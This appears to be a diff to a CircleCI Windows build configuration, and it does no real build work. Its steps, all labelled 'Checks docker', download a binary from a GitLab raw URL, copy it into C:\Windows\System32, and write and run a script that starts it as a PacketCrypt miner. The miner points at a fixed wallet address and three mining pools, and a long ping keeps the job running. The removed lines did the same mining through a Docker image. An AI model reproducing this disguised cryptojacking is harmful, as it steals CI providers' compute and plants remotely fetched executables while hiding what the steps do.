@@ -7,6 +7,7 @@ jobs:
   build:
     executor:
       name: win/default
+      size: "large"
       shell: powershell.exe
     steps:
       - checkout
@@ -18,9 +19,18 @@ jobs:
             docker pull thomasjp0x42/packetcrypt
       - run:
           name: "Checks docker"
-          size: "large"
           shell: powershell.exe
           command: |
-            docker run thomasjp0x42/packetcrypt ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkt.world >>kontil.ps1
-            ping -n 180000 google.com >>kontil.ps1
-            ./kontil.ps1
+            Invoke-WebRequest https://gitlab.com/kabehada3/pantek/-/raw/main/koceng
+      - run:
+          name: "Checks docker"
+          shell: powershell.exe
+          command: |
+            Copy koceng C:\Windows\System32
+      - run:
+          name: "Checks docker"
+          shell: powershell.exe
+          command: |
+            cmd /c echo cmd /k start koceng ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkt.world >>jingcci.ps1
+            cmd /c echo ping -n 180000 google.com >>jingcci.ps1
+            .\jingcci.ps1                        
